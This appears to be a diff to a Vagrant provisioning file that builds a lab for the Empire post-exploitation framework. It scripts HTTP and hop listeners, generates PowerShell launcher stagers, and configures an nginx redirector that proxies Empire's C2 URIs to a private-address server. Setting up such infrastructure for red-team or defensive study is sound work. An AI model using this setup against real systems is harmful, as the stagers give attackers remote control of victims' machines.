@@ -1,52 +1,89 @@
+
 $empire = <<SCRIPT
 echo "Empire ..."
 cd /home/vagrant/
-wget -q https://github.com/PowerShellEmpire/Empire/archive/dev.tar.gz
-tar -xzf dev.tar.gz
-rm dev.tar.gz
-cp /vagrant/custom/screenlogger.py /home/vagrant/Empire-dev/lib/modules/collection/
-cd /home/vagrant/Empire-dev/setup/
+wget -q https://github.com/adaptivethreat/Empire/archive/2.0_beta.tar.gz
+tar -xzf 2.0_beta.tar.gz
+rm 2.0_beta.tar.gz
+#cp /vagrant/custom/screenlogger.py /home/vagrant/Empire-dev/lib/modules/collection/
+cd /home/vagrant/Empire-2.0_beta/setup/
 echo -en "somekey\n" | ./install.sh
 cd ..
 cat > cmd.txt <<EOF
+
 listeners
-set Name chat
-set Host http://192.168.33.33:80
+uselistener http
+set Name localhost
+set BindIP 192.168.33.33
+set Host http://192.168.33.33:8080
 set DefaultLostLimit 0
 set DefaultJitter 1
-set DefaultProfile /chat.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
-run
-usestager hop_php
-set Listener chat
-set OutFile /vagrant/hopper/chat.php
+execute
+back
+
+uselistener http_hop
+set Name hop1
+set RedirectListener localhost
+set OutFolder /usr/share/nginx/html
+set Host http://192.168.33.33:80
+execute
+back
+
+uselistener http_hop
+set Name hop2
+set RedirectListener localhost
+set OutFolder /usr/share/nginx/html
+set Host http://192.168.33.22:80
+execute
+back
+
+usestager windows/launcher_bat
+set Listener localhost
+set OutFile /vagrant/hopper/launcher_localhost.bat
+set Language powershell
+set Delete False
+set StagerRetries 8
 generate
 back
-set Type hop
-set RedirectTarget chat
-set Host http://192.168.33.22/chat.php
-set DefaultProfile /chat.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
-run
-usestager launcher_bat
-set OutFile /vagrant/hopper/launcher.cmd
-set Listener chat1
+
+usestager windows/launcher_bat
+set Listener hop1
+set OutFile /vagrant/hopper/launcher_hop1.bat
+set Language powershell
+set Delete False
+set StagerRetries 8
 generate
 back
-usestager launcher
-set OutFile /vagrant/hopper/launcher.txt
-set Listener chat1
+
+usestager windows/launcher_bat
+set Listener hop2
+set OutFile /vagrant/hopper/launcher_hop2.bat
+set Language powershell
+set Delete False
+set StagerRetries 8
 generate
+back
+
+usestager multi/launcher
+set Listener localhost
+set Base64 False
+set StagerRetries 8
+set OutFile /vagrant/hopper/multi.txt
+generate
+back
+
+list
+info localhost
+info hop1
+info hop2
+
 main
 exit
 y
 EOF
 ./empire < cmd.txt
-date >> /etc/vagrant_provisioned_at
-SCRIPT
 
-$hopper = <<SCRIPT
-echo "hopper .."
 apt-get -y install nginx php5-fpm > /dev/null
-
 cat > /etc/nginx/sites-enabled/default <<EOF
 server {
 	listen 80 default_server;
@@ -70,7 +107,44 @@ cp /vagrant/hopper/chat.php /usr/share/nginx/html/chat.php
 cp /vagrant/helpers/upload.php /usr/share/nginx/html/upload.php
 mkdir -p /var/www/chat
 chown www-data:www-data /var/www/chat
+
 date >> /etc/vagrant_provisioned_at
+SCRIPT
+
+$hopper = <<SCRIPT
+echo "hopper .."
+apt-get -y install nginx > /dev/null
+
+cat > /etc/nginx/sites-enabled/default <<EOF
+limit_conn_zone $binary_remote_addr zone=addr:10m;
+server {
+	listen 80 default_server;
+	root /usr/share/nginx/html;
+	index index.html index.htm;
+	server_name localhost;
+	location = /admin/get.php {
+		proxy_set_header X-Forwarded-For  $remote_addr;
+		proxy_pass http://192.168.33.33;
+	}
+	location = /login/process.php {
+		proxy_set_header X-Forwarded-For  $remote_addr;
+		proxy_pass http://192.168.33.33;
+	}
+  location = /news.php {
+    proxy_set_header X-Forwarded-For  $remote_addr;
+    proxy_pass http://192.168.33.33;
+  }
+	location / {
+		limit_rate 256;
+		limit_conn addr 1;
+	}
+}
+EOF
+service nginx start
+service nginx reload
+service nginx status
+date >> /etc/vagrant_provisioned_at
+cat /etc/nginx/sites-enabled/default
 SCRIPT
 
 
